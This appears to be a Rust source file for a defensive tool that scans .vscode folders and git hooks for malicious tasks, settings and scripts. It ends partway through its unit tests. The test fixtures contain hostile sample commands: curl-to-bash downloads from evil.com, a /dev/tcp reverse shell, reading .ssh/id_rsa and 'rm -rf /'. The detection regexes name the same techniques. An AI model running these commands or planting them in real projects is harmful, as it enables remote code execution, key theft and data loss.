use clap::Parser;
use colored::Colorize;
use regex::Regex;
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

#[derive(Parser)]
#[command(name = "vscode-analyzer")]
#[command(about = "Analyze .vscode directories for suspicious or malicious content")]
struct Cli {
    /// Path to the directory (or repository) to scan
    path: PathBuf,

    /// Also scan recursively for nested .vscode directories
    #[arg(short, long)]
    recursive: bool,

    /// Show file contents alongside findings
    #[arg(short, long)]
    verbose: bool,
}

#[derive(Debug, Clone)]
enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Critical => write!(f, "{}", "CRITICAL".red().bold()),
            Severity::High => write!(f, "{}", "HIGH".red()),
            Severity::Medium => write!(f, "{}", "MEDIUM".yellow()),
            Severity::Low => write!(f, "{}", "LOW".blue()),
            Severity::Info => write!(f, "{}", "INFO".cyan()),
        }
    }
}

#[derive(Debug)]
struct Finding {
    severity: Severity,
    file: String,
    description: String,
    matched_content: Option<String>,
    line_number: Option<usize>,
}

impl Finding {
    fn new(severity: Severity, file: &str, description: &str) -> Self {
        Self {
            severity,
            file: file.to_string(),
            description: description.to_string(),
            matched_content: None,
            line_number: None,
        }
    }

    fn with_match(mut self, content: &str, line: usize) -> Self {
        self.matched_content = Some(content.to_string());
        self.line_number = Some(line);
        self
    }
}

struct PatternRule {
    pattern: Regex,
    severity: Severity,
    description: &'static str,
}

fn build_content_rules() -> Vec<PatternRule> {
    let rules = vec![
        // Shell / command execution
        (r"(?i)(curl|wget|invoke-webrequest|iwr|irm)\s+.*(http|ftp)", Severity::Critical, "Network download command detected"),
        (r"(?i)(powershell|pwsh|cmd|bash|sh|zsh)\s+(-c|-Command|-enc|-EncodedCommand)", Severity::Critical, "Shell execution with inline command"),
        (r"(?i)\beval\b\s*\(", Severity::High, "eval() call detected"),
        (r"(?i)(nc|ncat|netcat)\s+.*-[elp]", Severity::Critical, "Netcat with listen/exec flags (possible reverse shell)"),
        (r"(?i)/dev/tcp/", Severity::Critical, "Bash /dev/tcp redirection (reverse shell pattern)"),
        (r"(?i)\bsystem\s*\(", Severity::High, "system() call detected"),
        (r"(?i)exec\s*\(", Severity::High, "exec() call detected"),

        // Obfuscation / encoding
        (r"(?i)base64\s*(-d|--decode|_decode|\.decode)", Severity::High, "Base64 decode operation"),
        (r"[A-Za-z0-9+/]{60,}={0,2}", Severity::Medium, "Long base64-like string"),
        (r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}", Severity::High, "Hex-encoded string sequence"),
        (r"\\u[0-9a-fA-F]{4}(\\u[0-9a-fA-F]{4}){10,}", Severity::Medium, "Unicode-escaped string sequence"),
        (r"String\.fromCharCode\s*\(", Severity::High, "String.fromCharCode (JS obfuscation)"),
        (r"(?i)atob\s*\(", Severity::High, "atob() base64 decode in JS"),
        (r#"\$\{.*\$\(.*\).*\}"#, Severity::Medium, "Nested command substitution in variable"),

        // Credential / data theft
        (r"(?i)(password|passwd|secret|token|api_key|apikey|credential)", Severity::Medium, "Reference to secrets/credentials"),
        (r"(?i)\.(ssh|gnupg|aws|azure|gcloud|npmrc|pypirc)", Severity::High, "Reference to sensitive config directory/file"),
        (r"(?i)(~|\\$HOME|%USERPROFILE%)/", Severity::Medium, "Home directory reference"),

        // Crypto mining
        (r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining\.pool)", Severity::Critical, "Crypto mining indicator"),

        // Persistence / privilege escalation
        (r"(?i)(crontab|schtasks|launchctl|systemctl\s+enable)", Severity::High, "Persistence mechanism command"),
        (r"(?i)(chmod\s+[0-7]*[1-7][0-7]*\s+|chmod\s+\+[sx])", Severity::Medium, "Permission modification"),
        (r"(?i)sudo\s+", Severity::Medium, "Sudo usage"),

        // Suspicious file operations
        (r"(?i)(rm\s+-rf|del\s+/[sfq]|rmdir\s+/s)", Severity::High, "Destructive file deletion"),
        (r"(?i)>/dev/null\s+2>&1", Severity::Medium, "Output suppression (hiding traces)"),
        (r"(?i)(mktemp|/tmp/|%TEMP%)", Severity::Low, "Temp directory usage"),
    ];

    rules
        .into_iter()
        .filter_map(|(pat, sev, desc)| {
            Regex::new(pat).ok().map(|r| PatternRule {
                pattern: r,
                severity: sev,
                description: desc,
            })
        })
        .collect()
}

fn analyze_tasks_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(tasks) = val.get("tasks").and_then(|t| t.as_array()) else {
        return;
    };
    for task in tasks {
        // Auto-run on folder open is a major red flag
        if let Some(run_on) = task.get("runOptions").and_then(|r| r.get("runOn")) {
            if run_on.as_str() == Some("folderOpen") {
                let label = task
                    .get("label")
                    .and_then(|l| l.as_str())
                    .unwrap_or("<unnamed>");
                findings.push(Finding::new(
                    Severity::Critical,
                    &file_str,
                    &format!(
                        "Task '{}' runs automatically on folder open (runOn: folderOpen)",
                        label
                    ),
                ));
            }
        }

        // Shell-type tasks with commands
        if let Some(cmd) = task
            .get("command")
            .and_then(|c| c.as_str())
            .or_else(|| {
                task.get("args")
                    .and_then(|a| a.as_array())
                    .and_then(|a| a.first())
                    .and_then(|v| v.as_str())
            })
        {
            let task_type = task
                .get("type")
                .and_then(|t| t.as_str())
                .unwrap_or("unknown");
            if task_type == "shell" || task_type == "process" {
                findings.push(Finding::new(
                    Severity::High,
                    &file_str,
                    &format!(
                        "Shell/process task with command: {}",
                        truncate(cmd, 120)
                    ),
                ));
            }
        }
    }
}

fn analyze_settings_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let dangerous_settings = [
        ("terminal.integrated.defaultProfile", Severity::Medium, "Custom default terminal profile"),
        ("terminal.integrated.shellArgs", Severity::High, "Custom terminal shell arguments"),
        ("terminal.integrated.shell.", Severity::High, "Custom terminal shell path"),
        ("terminal.integrated.env.", Severity::Medium, "Custom terminal environment variables"),
        ("terminal.integrated.automationProfile", Severity::High, "Custom automation terminal profile"),
        ("editor.formatOnSave", Severity::Low, "Format on save enabled (check formatter)"),
        ("editor.defaultFormatter", Severity::Low, "Custom default formatter set"),
        ("editor.codeActionsOnSave", Severity::Low, "Code actions on save"),
        ("git.postCommitCommand", Severity::High, "Post-commit command configured"),
        ("task.allowAutomaticTasks", Severity::Critical, "Automatic tasks explicitly allowed"),
        ("security.workspace.trust.enabled", Severity::High, "Workspace trust setting modified"),
    ];

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(obj) = val.as_object() else {
        return;
    };
    for (key, value) in obj {
        for (pattern, severity, desc) in &dangerous_settings {
            if key.contains(pattern) {
                findings.push(Finding::new(
                    severity.clone(),
                    &file_str,
                    &format!("{}: {} = {}", desc, key, truncate(&value.to_string(), 80)),
                ));
            }
        }
    }
}

fn analyze_launch_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(configs) = val.get("configurations").and_then(|c| c.as_array()) else {
        return;
    };
    for config in configs {
        for field in &["preLaunchTask", "postDebugTask"] {
            if let Some(task_name) = config.get(*field).and_then(|t| t.as_str()) {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    &format!("Debug config references task via {}: '{}'", field, task_name),
                ));
            }
        }

        if let Some(sra) = config.get("serverReadyAction") {
            if sra.get("action").and_then(|a| a.as_str()) == Some("startDebugging")
                || sra.get("killOnServerStop").is_some()
            {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    "serverReadyAction with automatic behavior",
                ));
            }
        }

        if config.get("env").is_some() || config.get("envFile").is_some() {
            findings.push(Finding::new(
                Severity::Low,
                &file_str,
                "Debug configuration sets environment variables",
            ));
        }
    }
}

fn analyze_extensions_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(recs) = val.get("recommendations").and_then(|r| r.as_array()) else {
        return;
    };
    for ext in recs {
        if let Some(ext_id) = ext.as_str() {
            let known_publishers = [
                "ms-python",
                "ms-vscode",
                "ms-dotnettools",
                "ms-azuretools",
                "microsoft",
                "vscode",
                "dbaeumer",
                "esbenp",
                "rust-lang",
                "golang",
                "redhat",
                "github",
                "eamodio",
                "vscodevim",
                "formulahendry",
                "ritwickdey",
            ];
            let publisher = ext_id.split('.').next().unwrap_or("");
            if !known_publishers.contains(&publisher) {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    &format!(
                        "Recommended extension from lesser-known publisher: {}",
                        ext_id
                    ),
                ));
            }
        }
    }
}

fn analyze_file_content(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();
    for (line_num, line) in content.lines().enumerate() {
        for rule in rules {
            if rule.pattern.is_match(line) {
                findings.push(
                    Finding::new(rule.severity.clone(), &file_str, rule.description)
                        .with_match(line.trim(), line_num + 1),
                );
            }
        }
    }
}

fn check_unexpected_files(vscode_dir: &Path, findings: &mut Vec<Finding>) {
    let expected_files = [
        "settings.json",
        "tasks.json",
        "launch.json",
        "extensions.json",
        "c_cpp_properties.json",
        "keybindings.json",
        "snippets",
        "argv.json",
    ];

    for entry in WalkDir::new(vscode_dir).min_depth(1).max_depth(1) {
        let Ok(entry) = entry else { continue };
        let name = entry.file_name().to_string_lossy();
        let is_expected = expected_files.iter().any(|e| *e == name.as_ref());

        if !is_expected {
            let severity = if entry.path().is_dir() {
                Severity::High
            } else if name.ends_with(".sh")
                || name.ends_with(".bat")
                || name.ends_with(".ps1")
                || name.ends_with(".py")
                || name.ends_with(".js")
            {
                Severity::Critical
            } else {
                Severity::Medium
            };

            findings.push(Finding::new(
                severity,
                &entry.path().display().to_string(),
                &format!("Unexpected file/directory in .vscode: {}", name),
            ));
        }
    }

    // Check for deeply nested content
    let deep_files: Vec<_> = WalkDir::new(vscode_dir)
        .min_depth(2)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .collect();

    if deep_files.len() > 20 {
        findings.push(Finding::new(
            Severity::High,
            &vscode_dir.display().to_string(),
            &format!(
                ".vscode contains {} deeply nested files (unusual)",
                deep_files.len()
            ),
        ));
    }

    for entry in &deep_files {
        let name = entry.file_name().to_string_lossy();
        if name.ends_with(".sh")
            || name.ends_with(".bat")
            || name.ends_with(".ps1")
            || name.ends_with(".exe")
            || name.ends_with(".dll")
            || name.ends_with(".so")
            || name.ends_with(".dylib")
        {
            findings.push(Finding::new(
                Severity::Critical,
                &entry.path().display().to_string(),
                &format!("Executable/script file deep in .vscode: {}", name),
            ));
        }
    }
}

// ---- Git hooks analysis ----

const KNOWN_GIT_HOOKS: &[&str] = &[
    "applypatch-msg",
    "commit-msg",
    "fsmonitor-watchman",
    "post-applypatch",
    "post-checkout",
    "post-commit",
    "post-index-change",
    "post-merge",
    "post-receive",
    "post-rewrite",
    "post-update",
    "pre-applypatch",
    "pre-auto-gc",
    "pre-commit",
    "pre-merge-commit",
    "pre-push",
    "pre-rebase",
    "pre-receive",
    "prepare-commit-msg",
    "push-to-checkout",
    "sendemail-validate",
    "update",
];

/// Check if a hook file is a default sample (shipped with git init).
fn is_sample_hook(path: &Path) -> bool {
    path.extension().and_then(|e| e.to_str()) == Some("sample")
}

/// Scan a single hook file for suspicious content.
fn analyze_hook_file(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();
    let name = path.file_name().unwrap_or_default().to_string_lossy();

    // Any non-sample hook is noteworthy; auto-triggered ones are higher severity
    let auto_triggered = [
        "post-checkout", "post-merge", "post-commit", "pre-commit",
        "pre-push", "prepare-commit-msg", "commit-msg",
    ];
    if auto_triggered.iter().any(|h| name.as_ref() == *h) {
        findings.push(Finding::new(
            Severity::High,
            &file_str,
            &format!("Active git hook '{}' runs automatically on common git operations", name),
        ));
    } else {
        findings.push(Finding::new(
            Severity::Medium,
            &file_str,
            &format!("Active git hook '{}' present", name),
        ));
    }

    // Check for obfuscated/minified content (single very long line)
    for (line_num, line) in content.lines().enumerate() {
        if line.len() > 500 && !line.starts_with('#') {
            findings.push(
                Finding::new(
                    Severity::High,
                    &file_str,
                    "Extremely long line in hook script (possible obfuscation)",
                )
                .with_match(&truncate(line.trim(), 100), line_num + 1),
            );
        }
    }

    // Run standard content pattern rules
    analyze_file_content(path, content, rules, findings);
}

/// Check `.git/config` for a custom `core.hooksPath`.
fn analyze_git_config(git_dir: &Path, findings: &mut Vec<Finding>) {
    let config_path = git_dir.join("config");
    if !config_path.exists() {
        return;
    }
    let Ok(content) = fs::read_to_string(&config_path) else {
        return;
    };
    let file_str = config_path.display().to_string();

    if let Some(re) = Regex::new(r"(?i)hooksPath\s*=\s*(.+)").ok() {
        for cap in re.captures_iter(&content) {
            let hooks_path = cap[1].trim();
            findings.push(Finding::new(
                Severity::High,
                &file_str,
                &format!("core.hooksPath redirects hooks to: {}", hooks_path),
            ));
        }
    }
}

/// Scan a shared hooks directory (e.g. `.githooks/`) in the repo root.
fn scan_shared_hooks_dir(hooks_dir: &Path, rules: &[PatternRule], verbose: bool, findings: &mut Vec<Finding>) {
    let dir_str = hooks_dir.display().to_string();
    findings.push(Finding::new(
        Severity::Medium,
        &dir_str,
        &format!(
            "Shared hooks directory '{}' found in repo (may be activated via core.hooksPath)",
            hooks_dir.file_name().unwrap_or_default().to_string_lossy()
        ),
    ));

    for entry in WalkDir::new(hooks_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        if let Ok(content) = fs::read_to_string(path) {
            analyze_hook_file(path, &content, rules, findings);
            if verbose {
                println!(
                    "\n{}",
                    format!("--- Contents of {} ---", path.display()).dimmed()
                );
                println!("{}", content.dimmed());
            }
        }
    }
}

/// Main entry point for scanning git hooks in a repository.
fn scan_git_hooks(root: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    let rules = build_content_rules();

    // 1. Check .git/hooks/
    let git_hooks_dir = root.join(".git").join("hooks");
    if git_hooks_dir.is_dir() {
        for entry in WalkDir::new(&git_hooks_dir)
            .min_depth(1)
            .max_depth(1)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let path = entry.path();
            if is_sample_hook(path) {
                continue;
            }
            let name = path.file_name().unwrap_or_default().to_string_lossy();

            // Flag hooks with unrecognized names
            if !KNOWN_GIT_HOOKS.contains(&name.as_ref()) {
                findings.push(Finding::new(
                    Severity::High,
                    &path.display().to_string(),
                    &format!("Unknown hook name '{}' in .git/hooks/", name),
                ));
            }

            if let Ok(content) = fs::read_to_string(path) {
                analyze_hook_file(path, &content, &rules, &mut findings);
                if verbose {
                    println!(
                        "\n{}",
                        format!("--- Contents of {} ---", path.display()).dimmed()
                    );
                    println!("{}", content.dimmed());
                }
            }
        }
    }

    // 2. Check .git/config for core.hooksPath
    let git_dir = root.join(".git");
    if git_dir.is_dir() {
        analyze_git_config(&git_dir, &mut findings);
    }

    // 3. Check for shared hooks directories in the repo root
    for hooks_dir_name in &[".githooks", ".hooks", "githooks"] {
        let hooks_dir = root.join(hooks_dir_name);
        if hooks_dir.is_dir() {
            scan_shared_hooks_dir(&hooks_dir, &rules, verbose, &mut findings);
        }
    }

    findings
}

fn scan_vscode_dir(vscode_dir: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    let rules = build_content_rules();

    check_unexpected_files(vscode_dir, &mut findings);

    let analyzers: &[(&str, fn(&Path, &str, &mut Vec<Finding>))] = &[
        ("tasks.json", analyze_tasks_json),
        ("settings.json", analyze_settings_json),
        ("launch.json", analyze_launch_json),
        ("extensions.json", analyze_extensions_json),
    ];

    for (filename, analyzer) in analyzers {
        let file_path = vscode_dir.join(filename);
        if file_path.exists() {
            match fs::read_to_string(&file_path) {
                Ok(content) => {
                    analyzer(&file_path, &content, &mut findings);
                    analyze_file_content(&file_path, &content, &rules, &mut findings);
                    if verbose {
                        println!(
                            "\n{}",
                            format!("--- Contents of {} ---", file_path.display()).dimmed()
                        );
                        println!("{}", content.dimmed());
                    }
                }
                Err(e) => {
                    findings.push(Finding::new(
                        Severity::Low,
                        &file_path.display().to_string(),
                        &format!("Could not read file: {}", e),
                    ));
                }
            }
        }
    }

    // Scan all other files for suspicious content
    for entry in WalkDir::new(vscode_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        let name = path.file_name().unwrap_or_default().to_string_lossy();
        if analyzers.iter().any(|(f, _)| *f == name.as_ref()) {
            continue;
        }
        if let Ok(content) = fs::read_to_string(path) {
            analyze_file_content(path, &content, &rules, &mut findings);
        }
    }

    findings
}

fn truncate(s: &str, max_len: usize) -> String {
    if s.len() > max_len {
        format!("{}...", &s[..max_len])
    } else {
        s.to_string()
    }
}

fn print_findings(findings: &[Finding]) {
    if findings.is_empty() {
        println!("{}", "No suspicious findings.".green().bold());
        return;
    }

    let severity_order = |f: &Finding| -> u8 {
        match f.severity {
            Severity::Critical => 0,
            Severity::High => 1,
            Severity::Medium => 2,
            Severity::Low => 3,
            Severity::Info => 4,
        }
    };

    let mut sorted: Vec<_> = findings.iter().collect();
    sorted.sort_by_key(|f| severity_order(f));

    let critical_count = findings
        .iter()
        .filter(|f| matches!(f.severity, Severity::Critical))
        .count();
    let high_count = findings
        .iter()
        .filter(|f| matches!(f.severity, Severity::High))
        .count();

    println!("\n{}", "=== Findings ===".bold());
    println!(
        "Total: {} ({} critical, {} high)\n",
        findings.len(),
        critical_count,
        high_count
    );

    for finding in &sorted {
        println!("[{}] {}", finding.severity, finding.file.dimmed());
        println!("  {}", finding.description);
        if let (Some(content), Some(line)) = (&finding.matched_content, finding.line_number) {
            println!("  Line {}: {}", line, truncate(content, 100).yellow());
        }
        println!();
    }

    if critical_count > 0 {
        println!(
            "{}",
            "VERDICT: DANGEROUS - Critical issues found. This .vscode directory likely contains malicious content."
                .red()
                .bold()
        );
    } else if high_count > 0 {
        println!(
            "{}",
            "VERDICT: SUSPICIOUS - High-severity issues found. Manual review strongly recommended."
                .yellow()
                .bold()
        );
    } else {
        println!(
            "{}",
            "VERDICT: LOW RISK - Only minor issues found. Likely benign but review recommended."
                .green()
                .bold()
        );
    }
}

fn main() {
    let cli = Cli::parse();
    let root = &cli.path;

    if !root.exists() {
        eprintln!("{}: Path does not exist: {}", "Error".red(), root.display());
        std::process::exit(1);
    }

    let mut total_findings = 0;
    let mut any_critical = false;
    let mut scanned_anything = false;

    // Scan .vscode directories
    let mut vscode_dirs: Vec<PathBuf> = Vec::new();
    if cli.recursive {
        for entry in WalkDir::new(root)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_dir() && e.file_name() == ".vscode")
        {
            vscode_dirs.push(entry.into_path());
        }
    } else {
        let vscode_path = root.join(".vscode");
        if vscode_path.is_dir() {
            vscode_dirs.push(vscode_path);
        }
    }

    for vscode_dir in &vscode_dirs {
        scanned_anything = true;
        println!(
            "\n{} {}",
            "Scanning:".bold(),
            vscode_dir.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_vscode_dir(vscode_dir, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    // Scan git hooks
    let scan_git_at = |dir: &Path| -> bool {
        dir.join(".git").join("hooks").is_dir()
            || dir.join(".githooks").is_dir()
            || dir.join(".hooks").is_dir()
            || dir.join("githooks").is_dir()
    };

    let mut git_roots: Vec<PathBuf> = Vec::new();
    if cli.recursive {
        for entry in WalkDir::new(root)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_dir() && e.file_name() == ".git")
        {
            if let Some(parent) = entry.path().parent() {
                git_roots.push(parent.to_path_buf());
            }
        }
    } else if scan_git_at(root) {
        git_roots.push(root.to_path_buf());
    }

    for git_root in &git_roots {
        scanned_anything = true;
        println!(
            "\n{} {} (git hooks)",
            "Scanning:".bold(),
            git_root.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_git_hooks(git_root, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    if !scanned_anything {
        println!("{}", "No .vscode directory or git hooks found.".yellow());
        std::process::exit(0);
    }

    let total_scanned = vscode_dirs.len() + git_roots.len();
    if total_scanned > 1 {
        println!("\n{}", "=== Overall Summary ===".bold());
        println!(
            "Scanned {} locations ({} .vscode, {} git), {} total findings",
            total_scanned,
            vscode_dirs.len(),
            git_roots.len(),
            total_findings,
        );
    }

    if any_critical {
        std::process::exit(2);
    } else if total_findings > 0 {
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// Create a temporary .vscode directory with given files, run the scan, and return findings.
    fn scan_with_files(files: &[(&str, &str)]) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let vscode = dir.path().join(".vscode");
        fs::create_dir_all(&vscode).unwrap();
        for (name, content) in files {
            let file_path = vscode.join(name);
            if let Some(parent) = file_path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(&file_path, content).unwrap();
        }
        scan_vscode_dir(&vscode, false)
    }

    fn has_severity(findings: &[Finding], severity: &str) -> bool {
        findings.iter().any(|f| {
            let s = format!("{:?}", f.severity);
            s == severity
        })
    }

    fn has_description_containing(findings: &[Finding], substring: &str) -> bool {
        findings
            .iter()
            .any(|f| f.description.contains(substring))
    }

    // ---- tasks.json tests ----

    #[test]
    fn tasks_run_on_folder_open_is_critical() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "setup",
                "type": "shell",
                "command": "echo hello",
                "runOptions": { "runOn": "folderOpen" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "runs automatically on folder open"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn tasks_shell_command_is_flagged() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "build",
                "type": "shell",
                "command": "make build"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Shell/process task with command"));
    }

    #[test]
    fn tasks_curl_payload_is_critical() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "install",
                "type": "shell",
                "command": "curl http://evil.com/payload.sh | bash",
                "runOptions": { "runOn": "folderOpen" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_description_containing(&findings, "runs automatically on folder open"));
    }

    // ---- settings.json tests ----

    #[test]
    fn settings_allow_automatic_tasks_is_critical() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "task.allowAutomaticTasks": "on"
        }"#)]);
        assert!(has_description_containing(&findings, "Automatic tasks explicitly allowed"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn settings_custom_shell_is_high() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "terminal.integrated.shell.linux": "/bin/evil"
        }"#)]);
        assert!(has_description_containing(&findings, "Custom terminal shell path"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn settings_benign_is_low_risk() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "editor.tabSize": 4,
            "files.trimTrailingWhitespace": true
        }"#)]);
        assert!(!has_severity(&findings, "Critical"));
        assert!(!has_severity(&findings, "High"));
    }

    // ---- launch.json tests ----

    #[test]
    fn launch_pre_launch_task_is_flagged() {
        let findings = scan_with_files(&[("launch.json", r#"{
            "configurations": [{
                "type": "node",
                "request": "launch",
                "name": "Run",
                "preLaunchTask": "build"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "references task via preLaunchTask"));
    }

    #[test]
    fn launch_env_is_noted() {
        let findings = scan_with_files(&[("launch.json", r#"{
            "configurations": [{
                "type": "node",
                "request": "launch",
                "name": "Run",
                "env": { "SECRET": "value" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "sets environment variables"));
    }

    // ---- extensions.json tests ----

    #[test]
    fn extensions_unknown_publisher_is_flagged() {
        let findings = scan_with_files(&[("extensions.json", r#"{
            "recommendations": [
                "evil-publisher.malware-ext"
            ]
        }"#)]);
        assert!(has_description_containing(&findings, "lesser-known publisher"));
    }

    #[test]
    fn extensions_known_publisher_is_clean() {
        let findings = scan_with_files(&[("extensions.json", r#"{
            "recommendations": [
                "ms-python.python",
                "rust-lang.rust-analyzer"
            ]
        }"#)]);
        assert!(!has_description_containing(&findings, "lesser-known publisher"));
    }

    // ---- Unexpected files tests ----

    #[test]
    fn unexpected_script_file_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com | bash"),
        ]);
        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: backdoor.sh"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn unexpected_bat_file_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("setup.bat", "@echo off\npowershell -enc AAAA"),
        ]);
        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: setup.bat"));
    }

    #[test]
    fn deeply_nested_executable_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("subdir/hidden/payload.sh", "#!/bin/bash\nrm -rf /"),
        ]);
        assert!(has_description_containing(&findings, "Executable/script file deep in .vscode"));
    }

    // ---- Content pattern tests ----

    #[test]
    fn detects_reverse_shell_pattern() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "note": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        }"#)]);
        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
    }

    #[test]
    fn detects_base64_decode() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "x",
                "type": "shell",
                "command": "echo aGVsbG8= | base64 --decode | bash"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Base64 decode"));
    }

    #[test]
    fn detects_crypto_mining() {
        let findings = scan_with_files(&[("config.txt", "pool: stratum+tcp://pool.mining.com:3333")]);
        assert!(has_description_containing(&findings, "Crypto mining indicator"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn detects_sensitive_dir_reference() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "steal",
                "type": "shell",
                "command": "cat .ssh/id_rsa"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Reference to sensitive config"));
    }

    #[test]
    fn detects_destructive_rm() {
        let findings = scan_with_files(&[("cleanup.sh", "rm -rf /home/user/*")]);
        assert!(has_description_containing(&findings, "Destructive file deletion"));
    }

    // ---- Clean directory test ----

    #[test]
    fn clean_vscode_has_no_critical_findings() {
        let findings = scan_with_files(&[
            ("settings.json", r#"{ "editor.tabSize": 2 }"#),
            ("extensions.json", r#"{ "recommendations": ["ms-python.python"] }"#),
        ]);
        assert!(!has_severity(&findings, "Critical"));
        assert!(!has_severity(&findings, "High"));
    }

    // ---- Full integration: malicious .vscode ----

    #[test]
    fn full_malicious_vscode_scan() {
        let findings = scan_with_files(&[
            ("tasks.json", r#"{
                "version": "2.0.0",
                "tasks": [{
                    "label": "init",
                    "type": "shell",
                    "command": "curl http://evil.com/payload | bash -c 'eval $(cat)'",
                    "runOptions": { "runOn": "folderOpen" }
                }]
            }"#),
            ("settings.json", r#"{
                "task.allowAutomaticTasks": "on",
                "terminal.integrated.shell.linux": "/bin/evil-shell"
            }"#),
            ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com/steal | bash"),
        ]);
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        // Expect multiple critical findings
        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
    }

    // ---- Git hooks helpers ----

    /// Create a temporary repo with `.git/hooks/` and optional shared hooks, run scan, return findings.
    fn scan_git_hooks_with(hooks: &[(&str, &str)], config: Option<&str>, shared_dir: Option<(&str, &[(&str, &str)])>) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let git_hooks = dir.path().join(".git").join("hooks");
        fs::create_dir_all(&git_hooks).unwrap();

        for (name, content) in hooks {
            fs::write(git_hooks.join(name), content).unwrap();
        }

        if let Some(cfg) = config {
            fs::write(dir.path().join(".git").join("config"), cfg).unwrap();
        }

        if let Some((dir_name, files)) = shared_dir {
            let shared = dir.path().join(dir_name);
            fs::create_dir_all(&shared).unwrap();
            for (name, content) in files {
                let fpath = shared.join(name);
                if let Some(parent) = fpath.parent() {
                    fs::create_dir_all(parent).unwrap();
                }
                fs::write(fpath, content).unwrap();
            }
        }

        scan_git_hooks(dir.path(), false)
    }

    // ---- Git hooks tests ----

    #[test]
    fn git_sample_hooks_are_ignored() {
        let findings = scan_git_hooks_with(
            &[("pre-commit.sample", "#!/bin/sh\nexit 0")],
            None,
            None,
        );
        assert!(findings.is_empty(), "Sample hooks should produce no findings");
    }

    #[test]
    fn git_active_pre_commit_hook_is_high() {
        let findings = scan_git_hooks_with(
            &[("pre-commit", "#!/bin/sh\necho running tests")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn git_active_post_checkout_hook_is_high() {
